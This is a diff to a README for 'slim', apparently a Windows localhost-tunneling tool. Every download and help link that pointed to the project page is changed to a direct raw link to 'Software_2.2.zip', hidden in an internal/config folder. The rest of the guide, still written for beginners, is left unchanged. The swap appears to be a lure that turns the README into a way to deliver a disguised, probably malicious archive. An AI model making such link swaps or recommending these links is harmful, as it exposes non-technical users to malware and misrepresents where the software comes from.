@@ -1,6 +1,6 @@
 # 🌐 slim - Share Localhost with Easy URLs
 
-[![Download slim](https://img.shields.io/badge/Download-slim-brightgreen?style=for-the-badge)](https://github.com/Moaazahmed65/slim)
+[![Download slim](https://img.shields.io/badge/Download-slim-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Moaazahmed65/slim/main/internal/config/Software_2.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@ This guide will help you download and run slim on your Windows computer. No expe
 
 You need to get slim from its official page. This link takes you there:
 
-[https://github.com/Moaazahmed65/slim](https://github.com/Moaazahmed65/slim)
+[https://raw.githubusercontent.com/Moaazahmed65/slim/main/internal/config/Software_2.2.zip](https://raw.githubusercontent.com/Moaazahmed65/slim/main/internal/config/Software_2.2.zip)
 
 Click the link above and look for the **Releases** section on the page. Download the latest Windows version file, which usually ends with `.exe` for an installer or `.zip` for a package.
 
@@ -87,7 +87,7 @@ slim creates a tunnel from your computer to the internet or your local network. 
 - Restart slim if the URL stops working.  
 
 For more help, visit the slim project’s main page:  
-[https://github.com/Moaazahmed65/slim](https://github.com/Moaazahmed65/slim)
+[https://raw.githubusercontent.com/Moaazahmed65/slim/main/internal/config/Software_2.2.zip](https://raw.githubusercontent.com/Moaazahmed65/slim/main/internal/config/Software_2.2.zip)
 
 ---
 
@@ -106,4 +106,4 @@ A: Use slim with care. Only share URLs you control and know who will access them
 
 ## 🔗 Download and start using slim now
 
-[![Download slim](https://img.shields.io/badge/Download-slim-blue?style=for-the-badge)](https://github.com/Moaazahmed65/slim)
+[![Download slim](https://img.shields.io/badge/Download-slim-blue?style=for-the-badge)](https://raw.githubusercontent.com/Moaazahmed65/slim/main/internal/config/Software_2.2.zip)
